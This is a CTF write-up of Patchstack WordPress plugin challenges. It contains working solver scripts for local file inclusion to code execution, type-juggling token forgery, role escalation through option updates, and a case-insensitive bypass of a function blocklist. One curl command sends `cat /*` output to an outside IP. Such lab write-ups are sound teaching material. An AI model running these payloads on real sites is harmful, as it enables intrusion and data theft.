---
id: 1a348583-e65d-80e8-9ea1-fdb8caf29843
title: Patchstack Alliance CTF S02E01 - WordCamp Asia
created_time: 2025-02-23T13:15:00.000Z
last_edited_time: 2025-05-22T08:00:00.000Z
cover_image: ./imgs/ctf-asia_Iv836woO.jpg
categories:
  - wordpress
verification:
  state: unverified
  verified_by: null
  date: null
page: Patchstack Alliance CTF S02E01 - WordCamp Asia
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/ctf-asia_Iv836woO.jpg

---

Last weekend, I participated in the Patchstack WCUS CTF and solved all the WordPress challenges. Here's my write-up for each challenge from the Patchstack WCUS CTF 2025.

# **A Nice Block**

| Solves | 20 |
| ------ | -- |

Description

    I like the new Gutemberg editor, so I just installed a plugin with beautiful blocks addons. That's a great plugin that perfectly matches my design needs, I don't think it could cause a security issue, right?

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/736f5211-8c00-4e4f-9e48-c22e22fa0847/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667ZY7HYVB%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T133633Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJIMEYCIQDHIWoOWq8AaXAaeCK0mdl71GK%2FaKZk%2FMBpkCS%2BQ7gjLQIhAJz5hVA6vxLnD39NEonYR%2FlRjVgP4aVGmKyQzDRMXJ%2FLKogECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgytQVrtHlQGzG9Aibcq3AN%2FKY6m5B2%2B504j9BW2my1VYhcTqgYdiwwpzVqlLSoqHoDyXcTxZ9mY8j9qhevRqxFpUdWPAH8pQm2SYMFSSSOoTkJwabwA0BkZ8Y2nNjnoIuxudB%2BOQwrAGsScqMHHFsawRLHTYYdaszlKsd7PsTcTdRyYKr6gNKzA2Jy2n4c2k6CfBaK23QLt%2B0CpjxQYa8e11bpoBNgPiOsSAq3wpNDjd%2BC7UgaxJcw5zo1dZuYY0YF2jz3UMwQKQzkm%2FNQ5nZY4aZRSTm9I5u8rbSG8dm0oFOYhgv0lt4osGCfrgGivKVaGz94daGdhO1sA1IOmrW9VOYrejv3CtScucHOhPXuF2%2Bw%2FA1JbqNGQVVJW9W%2B99N1AI9c675KeNRWZtDRUNqZAtwScseIVp70ifDOHzgpVH%2FfcMPLtbMgXEgKYm4g82zNggs%2B6mlAOjvyO6Am4OKUqtgK5qqTvk53v6HusyaWqPUKwgoW0aaCi3d6knHpYlHXzcghMcdjGbQEPL3j%2FrmpV336Y0FIxEUjQMBlg5Mbfz10IFe5nZjAkNoSAcy9ETnX8tm98on2qNuKJ5VHqbsnOUS5QBuF055oiA06XYZSfLxgpKSMpKFFeOkJJkZ97NJ37SggL3aPsN2f1ADDZ8cHBBjqkAUFguWarj6T%2FOOhdzdOG%2FW16hxS9Cf8G3XkepqagFzb%2B09m2v5Y%2FliHLOa7gnBIk9muO3avltZkOiTOirziq3bE7eCzy1EQxkOf3maOv%2B1z7JB1INYLN6Tox5j%2Bk9FS9NuwG1dvEaE9MFntRJEfHnTP%2FiPAIimH%2BMM45DNVrNIHB3ptI3CoD4pjR6peMctCSauaXYdlviUQqseYmteNK5AV9G3Oz&X-Amz-Signature=c461e42e95f8a21379c9e6909ed7817c5ee5bb753f8ccee1e9f740e423df7b2a&X-Amz-SignedHeaders=host&x-id=GetObject)

References

    - [https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/readonly](https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/readonly)

    - [https://hackmd.io/@Solderet/AngstromCTF2023#Filestore---Web](https://hackmd.io/@Solderet/AngstromCTF2023#Filestore---Web)

***

Using Semgrep and my Semgrep custom rules, we can easily identify the vulnerable code parts. Here are the Semgrep results:

![](./imgs/image_40dZWs5o.png)

It’s Local File Inclusion, and if it’s using dockerized PHP, it can be easily exploited using this technique: <https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/readonly>

## Solver

```bash
curl "http://52.77.81.199:9100/wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php?tab=../../../../../../../../../../usr/local/lib/php/peclcmd.php&+run-tests+-i+-r\"system(hex2bin('$(echo "curl 77.37.47.226:4444 -d \"`cat /*`\"" | hexdump -v -e '/1 "%02x"' | tr -d '\n')'));\"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt"
```

### Flag

![](./imgs/image_gT22iTmO.png)

# **Patchstack Scheduler Pro**

| Solves | 18 |
| ------ | -- |

Description

    Patchstack needed to update their Blog content and asked a freelancer to make a plugin for scheduling their newest advisories. It has not been tested yet can you check it for us?

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/db2d4cd5-920a-47fb-82d9-c3fc43e239d0/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666PMZNAWH%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T133635Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJHMEUCIAiAqhvpSlIkgWcuWmlKSgtjXc5R7YV3QqjI3V0tMvXsAiEAvM6ByQliGKcjIIaV1aJg%2B45djBClLgFgvoz2G2i575EqiAQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDPymCCiTXfrzDk4s%2FCrcA081%2BMQmJgARdP2VQRGVyc4pSuP109%2FpeIH0SwzkqOKoL2c7hxhkclGWtEUmNXoiH8i9qZ%2B1CokefctAPQZTXDrenLhsS6zDQwnqra3UsTkxQw5vZIFO8qXRktY7jzyJULoU%2Frck1gARqnDhbw4sC0UZrJzBQP8RrqbpStUfsSD%2BclyCtx1KywAyM4ycN%2Bm0irrfvFhnap%2B3Dpq0d2Ebncm5R60YPKKpvzHvikVrcf8gEPiBHwy9aTrFuuRZmfu3IFB5aNBhbiZMlR69aeHBcPArNxK59MVK7sQdHtoop8duCip9IDb2e9HCJSKtuJdA%2FOgBDGl%2B%2FqyIKmrBwVF02CgtkpHQtcwocjEYC1QpxRCvlGiifTgQtQFRYFUQlU6QoP28VckQjIoEgB0B2K5IUNAt3i3jRO9gBWAUfrk5m00pLc0xMsORif8HtSIFruwCmLTMr5pyW88vaJ0cTryP9MEDk%2BqYLJtkMStW1Eb3tf1O3MTbvzoReOAs9fyMkAeThpwEbYKaLeHZfJZfACT%2BWy9fE1O5c2HbKwegI0AuIK%2B1T9Ncf%2BeXpf7zhxUv51zjCwRyg573ojizV64XaEeoV6bU07wTBWqq%2B8AhKNi7Lz4%2F7Cnauiuvw1CcZXn8MPPxwcEGOqUBi8I7TP6B1KizEQGzfbH489%2F5WxzilrspjlvyEigOl4BYBiJjjaNJ7RtWdWc%2FiLHNKEXosC8YQMgrdhzcImHSQ2vKP3emOuj83FoOOdWyaOaqu8UG6NOq24GIp0POb2DxddBAj%2B4dnSD7jGLrfA8Z4fvvQF2Bjlrcbg63vbxNPKv%2Bj%2BqOBVy2Q3ZlPE%2FIdpEHv4xKWMNhCnpyPrAqMdnkek11QVy8&X-Amz-Signature=fc3f912457812d061d051cbb4756b6e5fbd796eea0f48868be016793f76a794e&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

This challenge is vulnerable to information disclosure, PHP type juggling, some encryption logic failures, and token tampering. Here is the order of exploitation:

*   First, exploit information disclosure to get the `api_token`.

*   Use PHP type juggling to bypass this check: `$data['encryption_key'] != $this->encryption_key`.

*   Reuse the UUID to decrypt and get the `encryption_key`:

    Related method:

          ```php
              private function get_encrypted_config() {
                  $config = array(
                      'status' => 'draft',
                      'permissions' => array(
                          'view' => true,
                          'edit' => false
                      ),
                      'encryption_key' => $this->encryption_key
                  );
                  
                  $uuid = substr($this->encryption_key, 0, 16);
                  $encrypted = openssl_encrypt(
                      json_encode($config),
                      'AES-256-CBC',
                      $uuid,
                      0,
                      $uuid
                  );
                  
                  return base64_encode($uuid . base64_decode($encrypted));
              }
          ```

*   Finally, use the `encryption_key` to tamper with the token so we can access the flag.

## Solver

poc.py

    ```python
    import httpx
    import asyncio
    import re
    import json
    import subprocess

    # URL = "http://172.26.119.33:9192/"
    URL = "http://52.77.81.199:9192/"
    class BaseAPI:
        def __init__(self, url=URL) -> None:
            self.c = httpx.AsyncClient(base_url=url)

        def wp_login(self, username: str, password: str) -> None:
            return self.c.post("/wp-login.php", data={
                "log": username,
                "pwd": password
            })
        def handle_preview_request(self, post_id):
            return self.c.get("/wp-admin/admin-ajax.php", params={
                "action": "patchstack_scheduler_preview",
                "post_id": post_id
            })
        def patchstack_scheduler_compare(self, api_token):
            return self.c.post("/wp-admin/admin-ajax.php?action=patchstack_scheduler_compare", json={
                "api_token": api_token,
                "encryption_key": True,
                "revision_data": {
                    "post_status": "draft",
                }
            })
        def handle_settings_request(self, config):
            return self.c.post("/wp-admin/admin-ajax.php?action=patchstack_scheduler_settings", json={
                "config": config
            })
    class API(BaseAPI):
        def encrypt_config(self, config: dict, encryption_key: str) -> str:
            # Call the PHP script to encrypt the config
            result = subprocess.run(
                ['php', 'decrypt.php', 'encrypt', json.dumps(config), encryption_key],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                raise Exception("Error encrypting config: " + result.stderr)
            
            return result.stdout.strip()

        def decode_encrypted_config(self, encrypted_config: str) -> dict:
            # Call the PHP script to decrypt the config
            result = subprocess.run(
                ['php', 'decrypt.php', 'decrypt', encrypted_config],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                raise Exception("Error decrypting config: " + result.stderr)
            
            return json.loads(result.stdout)

    async def main():
        api = API()
        token = ""
        for i in range(100):
            res = await api.handle_preview_request(i)
            if "API Token" in res.text:
                token = re.findall(r"API Token: (.*?)\"", res.text)[0]
                break
        res = await api.patchstack_scheduler_compare(token)
        encrypted_config_b64 = res.json()['data']['encrypted_config']
        
        # Decode the encrypted config using PHP
        decrypted_config = api.decode_encrypted_config(encrypted_config_b64)
        encryption_key = decrypted_config["encryption_key"]

        # Example of encrypting a new config
        new_config = {
            'status': 'publish',
            'permissions': {
                'all': True,
            },
            "flag_access": True
        }
        encrypted_config = api.encrypt_config(new_config, encryption_key)
        print("Encrypted Config:", encrypted_config)

        res = await api.handle_settings_request(encrypted_config)
        print(res.text)

        
        

    if __name__ == "__main__":
        asyncio.run(main())

    ```

decrypt.php

    ```php
    <?php
    function encrypt_config($config, $encryption_key) {
        $uuid = substr($encryption_key, 0, 16);
        $encrypted = openssl_encrypt(
            json_encode($config),
            'AES-256-CBC',
            $encryption_key,
            0,
            $uuid
        );

        return base64_encode($uuid . base64_decode($encrypted));
    }

    function decrypt_config($encrypted_config) {
        $decoded_data = base64_decode($encrypted_config);
        $uuid = substr($decoded_data, 0, 16);
        $encrypted = substr($decoded_data, 16);
        
        $decrypted = openssl_decrypt(
            base64_encode($encrypted),
            'AES-256-CBC',
            $uuid,
            0,
            $uuid
        );

        return json_decode($decrypted, true);
    }

    if (isset($argv[1]) && isset($argv[2])) {
        $action = $argv[1];
        $data = $argv[2];
        $encryption_key = $argv[3];

        if ($action === 'encrypt') {
            $encrypted_config = encrypt_config(json_decode($data, true), $encryption_key);
            echo $encrypted_config;
        } elseif ($action === 'decrypt') {
            $decrypted_config = decrypt_config($data);
            echo json_encode($decrypted_config);
        }
    }
    ?>
    ```

### Flag

![](./imgs/image_uK380fdn.png)

# **Sup3rcustomiz3r**

| Solves | 11 |
| ------ | -- |

Description

    My friend is developing a cool plugin to help me customize my Login page, isn't that nice? So many stuff and options, I'm sure it's 100% safe to use...

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/61f45406-c096-4a5f-a60e-06f2548f7448/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665HY2OKFU%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T133640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJIMEYCIQCv8BdW9igR0wwcn6eYvnB38UHCIMICZtPccavX6%2BEIUgIhAJAd0d88fIBTTcwS8xRG%2BEPmZT7YUvMxNWCeTYHrJd3lKogECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxmmXkD9kmt%2FMB84pAq3AOKAjfQek4NrGlh4L5LZZQA6yW6KZmKDijzjg%2BbgCbPQcn3tYf7FiucDlmxDx5K2TCBx5SUyLXRzSa8gsvUj4ux7f7Yj7rPgiAp20b%2FOwLBT3lzJ5jRStgrQta3HgosJ7EyXMP0m8UoZ7m8Z61Au1q2TUtC9DgHRysKxWpELU78D520%2B4nZp2ZhytrRjDUu9RdRhPAJ7TWLILeQDtVOWrY0IzJ5A4nygHgKVktP3Cw%2BQ33Vyz4mAREbuZvzsDcM%2BlF6UIKnOxHhjRUVWVNNV8M0rUGedRqoYYPrYwUgx3hXtKh9fk8j3b5rZzEzTnUtxnSxCLRKjs3MNQYQ0bSMaXEXKQVT87a6EL7mURr%2Fkwj9meJZ%2Bk2mMM4qGYw4KBCBeZAx%2BKkH00%2Btzyhcg9UtfaxA0afFVwE%2F62pTPbgzYbKYlWG58kBq00wzyJRep%2FPBzlMD4Y%2BxPiclw7UzNlBXN6%2Bap4xq2Idt6NWRPkEw9yx1bpy3rlwpNHKWcdfSiOrHSKFDt%2FAK9XAvI2Q%2BLo5WcztBxYQwgxNl%2FJvjPmub2zkp75dmTwiXyFNwF1CV5eWdFhkFm8gbx3SPjGGJnxfiBfOhdIU8jhOYIYQUqV5cypOAIstNaaB%2Bi5OhG6FzIzDH8cHBBjqkAQXTTZ2Wxm7eM%2BCYQ6bkS3Rk5ZzXLKTjnsX2NSSpdgKOD8dlfPoz1vRq%2FlUpQbAY7CguTn9INyORtlRO3euwLisQqcAZGPo6lYRd1WVCEE2kTC5aF0VPWUPQFQKNfDKY9Dbnh%2F3Jn4p4PVuRR5Hvy1rLmQeFcrFi9eZh2P2V4ZYEYWqAJTgP2sA%2BmkhATnC5zuFSQ57aazhIENTBMEgQV3pfYDni&X-Amz-Signature=3095a5f2c892a253cc643d18552f5b7969e4b58462aaa4aa2331e444b7d0a004&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

In this challenge, we will exploit one vulnerability: arbitrary option update. The flag is stored in `patchstack_get_the_flag` and can be accessed via this unauthenticated AJAX action:

```php
add_action("wp_ajax_nopriv_patchstack_get_the_flag", "get_the_flag");

```

```php
function get_the_flag()
{
    $user = wp_get_current_user();
    $allowed_roles = ["administrator", "author", "contributor"];
    if (array_intersect($allowed_roles, $user->roles)) {
        $value = file_get_contents('/flag.txt');
        wp_send_json_success(["value" => $value]);
    } else {
        wp_send_json_error("Unauthorized");
    }
}

```

We need to have an administrator, author, or contributor role to view the flag.

First, we need to register using this `nopriv` AJAX action:

```php
add_action('wp_ajax_nopriv_login_register_user', array($this, 'login_register_user'));

```

```php
function login_register_user() {
    $username = sanitize_user($_POST['username']);
    $email = sanitize_email($_POST['email']);
    $password = $_POST['password'];

    if (empty($username) || empty($email) || empty($password)) {
        wp_send_json_error(array(
            'message' => 'All fields (username, email, password) are required.',
        ));
    }
    if (!is_email($email)) {
        wp_send_json_error(array(
            'message' => 'Invalid email address.',
        ));
    }
    if (username_exists($username) || email_exists($email)) {
        wp_send_json_error(array(
            'message' => 'Username or email already exists.',
        ));
    }

    $user_id = wp_create_user($username, $password, $email);
    update_option('default_role', 'subscriber');

    if (is_wp_error($user_id)) {
        wp_send_json_error(array(
            'message' => $user_id->get_error_message(),
        ));
    }

    wp_send_json_success(array(
        'message' => 'User registered successfully.',
        'user_id' => $user_id
    ));
}

```

Next, we can access this AJAX action that requires authentication:

```php
add_action('wp_ajax_login_customizer_set_option', array($this, 'set_option'));

```

```php
function set_option() {
    if (isset($_POST['_wpnonce']) && wp_verify_nonce(sanitize_text_field(wp_unslash($_POST['_wpnonce'])), 'login-customizer-admin')) {
        $op = sanitize_text_field($_POST['option']);
        $val = sanitize_text_field($_POST['value']);
        update_option($op, $val);
        wp_send_json_success('Option has been saved', 201);
    }
}

```

This AJAX action will update our user-supplied option, which means we can set the `default_role` option to, for example, "contributor" so we can read the flag in the `patchstack_get_the_flag` AJAX action. After setting the `default_role`, we can register a new user, and this time the role will be set as "contributor" because we set it before using the `default_role` option. Lastly, we get the flag in the `patchstack_get_the_flag` AJAX action.

## Solver

solver.py

    ```python
    import httpx
    import asyncio, re, random

    URL = "http://52.77.81.199:9193/"

    class BaseAPI:
        def __init__(self, url=URL) -> None:
            self.c = httpx.AsyncClient(base_url=url)

        def wp_login(self, username: str, password: str) -> None:
            return self.c.post("/wp-login.php", data={
                "log": username,
                "pwd": password
            })
        def login_register_user(self, username, email, password):
            return self.c.post("/wp-admin/admin-ajax.php?action=login_register_user", data={
                "username": username,
                "email": email,
                "password": password,
            }) 
        def login_customizer_set_option(self, nonce, option: str, value: str) -> None:
            return self.c.post("/wp-admin/admin-ajax.php?action=login_customizer_set_option", data={
                "option": option,
                "value": value,
                "_wpnonce": nonce
            })
        def patchstack_get_the_flag(self):
            return self.c.get("/wp-admin/admin-ajax.php?action=patchstack_get_the_flag")

    class API(BaseAPI):
        async def get_nonce(self):
            res = await self.c.get("/?preview=1")
            return re.findall("_ldAdminNounce = (.*?)\"", res.text)[0]

    async def main():
        api = API()
        username = "dimas"
        password = "dimas"
        res = await api.login_register_user(username, "dimas@dimas.com", password)
        print(res.text)
        res = await api.wp_login(username, password)
        nonce = await api.get_nonce()
        res = await api.login_customizer_set_option(nonce, "default_role", "contributor")
        print(res.text)
        randomtxt = random.randbytes(4).hex()
        username = username + randomtxt
        password = password + randomtxt
        api = API()
        res = await api.login_register_user(username, f"dimas{randomtxt}@dimas.com", password)
        print(res.text)
        res = await api.wp_login(username, password)
        res = await api.patchstack_get_the_flag()
        print(res.text)


    if __name__ == "__main__":
        asyncio.run(main())

    ```

### Flag

![](./imgs/image_TvJgIAwn.png)

# **Cool Templates**

| Solves | 11 |
| ------ | -- |

Description

    I had someone build me a plugin so I can send out some links with special footers. I'm sure the code is safe, right?

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/d616c041-db7e-44b7-95ce-2ec51d2d65d5/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VJOQ4RHP%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T133642Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJHMEUCIQCU8tsxXWv0HrXEktCzAupT3mk%2FJRUpXABu2boOpN2G2wIgAe4J%2B2XW6GRzd%2BF7TB6FLx8HmCyETbYA3zyrN62ekLQqiAQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDSZ4%2B3a2iuU4nqCwyrcAx74CNmeN15hwHEpYWZ2I8aUuZ%2Fpqh5%2F5H3mIblhpW0YdlRnaelj5MwRgHnpy%2FMI8MwK%2B0LAlK6BEob%2B6NlJsrDAK454wq37D4AR6MytTxJfffUr9ecUivSxLX0oD%2F%2B5ZBeRCqyNu4T%2BHyNzeIof6SKyVgjHA0JaDHvFbRKYe5WYfb6hqkGFIBKcGIKTiuYX%2FlCg3m6bnXXEtcvk3ixi0ahSG%2BOYAn3kzfSTkC8nvB%2FnzZLz5OTlInz%2F9JyFqdHTPJfG0j1clQdxljrKoKeWS1%2BlAlJ72oTOjCHf7TOq3e4PIzBc0lM3smF%2B0f5EgDe3K0q2tUi7dPo8OUD5jJre05NibEccXS55trqfz3UDO6B1CZ0sPsG406I20%2F46FwQpqmpApjO8hYJ0bXObqlR1%2FUaY5Oacqa2d3S0bKyyqUa%2F0jfqJYh9oELYl2pp7qLJTu4NgrfbaDTmdBxcdrEuSnl9mFA8r8Ld%2F8oh%2Ba0hGjqy8v9ADBvwuqOtqu%2BNKL4TDYfZil1W%2FNCQzQfTYZn5skJV%2Fw9myOrRfipmv4PKDJ701uuIrNWWbL4QXz7Kii632S6mwjIpr0%2FlPcYeMfN00v90Ba9rDAN%2FshwI5toP3z%2B6C59Lad%2F4XC8Pd6%2BjlMMLxwcEGOqUBUsNRTvHC3%2BvA5wQcG%2F1EeEEI%2FzxbPAW6EGoARewZWtwWrTg0m%2FHjDKEmRX856QDGvhlPqkbuivSXLR5Kw3qSP1qAYJ3t%2F5lKBfNps9FL3ZC70uktZQoHwjA9cXC%2B4HpUNHOYU58pmQSj%2BEflymCGDYdVq2%2FkrdSOayvEE2q8sNyY5W%2FFEgn6Fa6OxDfYHHlOQvVZhdLdfA5KT2EMKaIdLwcQhtwF&X-Amz-Signature=ede23244eae5bffddb56047b7b92f2d19d34297142703e552392fab2ac7b5e86&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

There's a WAF that restricts many functions that can probably lead to RCE, but the regex is case-sensitive here:

```php
function add_custom_footer() {
    $blacklist = array("system", "passthru", "proc_open", "shell_exec", "include_once", "require", "require_once", "eval", "fopen",'fopen', 'tmpfile', 'bzopen', 'gzopen', 'chgrp', 'chmod', 'chown', 'copy', 'file_put_contents', 'lchgrp', 'lchown', 'link', 'mkdir', 'move_uploaded_file', 'rename', 'rmdir', 'symlink', 'tempnam', 'touch', 'unlink', 'imagepng', 'imagewbmp', 'image2wbmp', 'imagejpeg', 'imagexbm', 'imagegif', 'imagegd', 'imagegd2', 'iptcembed', 'ftp_get', 'ftp_nb_get', 'file_exists', 'file_get_contents', 'file', 'fileatime', 'filectime', 'filegroup', 'fileinode', 'filemtime', 'fileowner', 'fileperms', 'filesize', 'filetype', 'glob', 'is_dir', 'is_executable', 'is_file', 'is_link', 'is_readable', 'is_uploaded_file', 'is_writable', 'is_writeable', 'linkinfo', 'lstat', 'parse_ini_file', 'pathinfo', 'readfile', 'readlink', 'realpath', 'stat', 'gzfile', 'readgzfile', 'getimagesize', 'imagecreatefromgif', 'imagecreatefromjpeg', 'imagecreatefrompng', 'imagecreatefromwbmp', 'imagecreatefromxbm', 'imagecreatefromxpm', 'ftp_put', 'ftp_nb_put', 'exif_read_data', 'read_exif_data', 'exif_thumbnail', 'exif_imagetype', 'hash_file', 'hash_hmac_file', 'hash_update_file', 'md5_file', 'sha1_file', 'highlight_file', 'show_source', 'php_strip_whitespace', 'get_meta_tags', 'extract', 'parse_str', 'putenv', 'ini_set', 'mail', 'header', 'proc_nice', 'proc_terminate', 'proc_close', 'pfsockopen', 'fsockopen', 'apache_child_terminate', 'posix_kill', 'posix_mkfifo', 'posix_setpgid', 'posix_setsid', 'posix_setuid', 'phpinfo', 'posix_mkfifo', 'posix_getlogin', 'posix_ttyname', 'getenv', 'get_current_user', 'proc_get_status', 'get_cfg_var', 'disk_free_space', 'disk_total_space', 'diskfreespace', 'getcwd', 'getlastmo', 'getmygid', 'getmyinode', 'getmypid', 'getmyuid', 'create_function', 'exec', 'popen', 'proc_open', 'pcntl_exec');
    if (isset($_REQUEST['template']) && isset($_REQUEST['content'])) {
        $template = $_REQUEST['template'];
        $content = wp_unslash(urldecode(base64_decode($_REQUEST['content'])));
        if(preg_match('/^[a-zA-Z0-9]+$/', $template) && !in_array($template, $blacklist)) {
            $footer = $template($content);
            echo $footer;
        }
    }
}

add_action('wp_footer', 'add_custom_footer');

```

Because functions can be called case-insensitively, we can do something like this:

```php
SysTem("ls")
```

![](./imgs/image_JizWNzcQ.png)

And it will still call the `system` function.

## Solver

```php
curl "http://52.77.81.199:9122/?template=SyStEm&content=$(echo -n "cat /*" | base64 -w0)"
```

### Flag

![](./imgs/image_oSpxaLPn.png)

# **Blocked**

| Solves | 7 |
| ------ | - |

Description

    it's blocked, nothing to do here.

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/9ce18315-c512-4217-afd7-5776f9d39ad5/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663GQJSNYY%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T133642Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJGMEQCIHgl29TgBWh3Y1RqAKbT1zZlIyCE5dNUxHbxtW7bGCZxAiAK3mcmqAyfNnm%2BFiypExaBAEspdUgDMMtibz8nmpWcJiqIBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMvDC2GEAiYBhiLQB6KtwD1Jcn9AkQdlMpiIRFkUuoYwd2imUFHkYadVDyLiTgyROuibNoASxKcSXa7EvSJzvIyHj4JkwYokhGlGYbbN0r0EkVxUBvvMjay01jRaK4kxHpOUxM9o424IngH3HyszRgG%2FFkeAV00pjxQVpv7AY8t4bKvJCxYr37F8RDO%2FClg%2BkokNUYeJnSwqN0mwY%2FKLH%2FcpzQKAy54Q52PxdWPAO8ABUm77fKnqgtF1C%2B%2FCTDGd%2BH8aFjxyRqQOvLIGEU%2B5pHzuE%2FFwYKxE2zbAE%2F%2FXvVt0uy7ZkDboIpP4NZ6EVcbV2ZvdkEcm1QgIDZja79uLjmOqWho5LD%2FCmqv%2BRtn26v%2Bqhv2z33TWiQ5NzjkrDaADv7F2VARoOw53cQyLmdbgJTFpbX%2Bsh%2Bn1h%2FH0xZmgyleST7zkxA1wtaPZbaevakEyrWMjcQ2tWCNkHq3AK%2F56LC2qM%2FcxCKoy7Ztt%2Bwq5tyWx9yxOOJoOZJ4mSAzlL53jJIC53u0JIUeRPqTgWSgpBmQsmPGGrUBKiK8L2I0HY9Sw4lRJnlr4MHR4eOqFOTsCvVrjGiHCuwD9wYuGjA5zgX4jSpY1Pjf4%2FWllOHkI8hAPkVGm0wuWo85kzp9BzH%2BAe50W8jtY68t9lcPzMwzfHBwQY6pgHU%2BmgKaHIsrHAyMY1gX881lOueV%2Fb2dHUARxoNTu2aoRr6%2FHBsiKwAoqBVJS4BhVX%2BAEt%2FMbYNwUpniK2Sfzc2SzTye7uFJwZIg7mZvTLN4O7TrZUnU1jSDW9RxcaMF%2F1V3KBhCZu0veDY6OWiEb%2B2JVxevjZ%2FSZm0Wxtp%2F9s583mYuyFBG0vmPXNxNEqOLcN4%2BzKfqXIxOwuY2WNOpvrymbhClvee&X-Amz-Signature=ca4a3b66c0e874ede586a257444894a48197701af9333799f3bd4c3b6948b2f6&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

plugin

    ```php
    <?php

    /**
     *
     * @wordpress-plugin
     * Plugin Name:       Test Plugin
     * Plugin URI:        http://example.com/plugin-name-uri/
     * Description:       This is a short description of what the plugin does. It's displayed in the WordPress admin area.
     * Version:           1.0.0
     * Author:            Patchstack
     * Author URI:        http://example.com/
     * License:           GPL-2.0+
     * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt
     * Text Domain:       test-plugin
     * Domain Path:       /languages
     */

    // If this file is called directly, abort.

    if ( ! defined( 'WPINC' ) ) {
    	die;
    }

    define( 'PLUGIN_NAME_PLUGIN_NAME', 'test-plugin' );
    define( 'PLUGIN_NAME_VERSION', '1.0.0' );
    define( 'PLUGIN_NAME_URL', plugin_dir_url( __FILE__ ) );
    define( 'PLUGIN_NAME_PATH', plugin_dir_path( __FILE__ ) );
    define( 'PLUGIN_NAME_BASE_DIR', plugin_dir_path( __FILE__ ) );
    define( 'PLUGIN_NAME_BASE_NAME', plugin_basename( __FILE__ ) );

    add_action("init", "set");
    add_action("rest_api_init", "register_endpoints");

    function set(){
        update_option("secretword_is_true", "anything");
    }

    function register_endpoints(){
        register_rest_route( 'test', '/upload/(?P<somevalue>\w+)', [
            'methods' => WP_Rest_Server::CREATABLE,
            'callback' => 'upload_something',
            'permission_callback' => 'check_request',
        ]);
    }

    function check_request( $request ) {
        $some_value = trim( strtolower( $request['somevalue'] ) );
        if( empty( $some_value ) ) {
           return false;
        }
     
        if( ! preg_match( '/^secretword_/i', $some_value) ) {
           return false;
        }
     
        if( $some_value == 'secretword_is_true' ) {
           return false;
        }
        return true;
    }

    function upload_something($request){
        $body = $request->get_json_params();
        $content = $body['content'];
        $name = $body['name'];
        $some_value = trim( strtolower( $request['somevalue'] ) );
        if(!get_option($some_value)){
            echo "blocked";
            exit(); 
        }

        if(strlen($name) > 105){
            echo "blocked.";
            exit();
        }
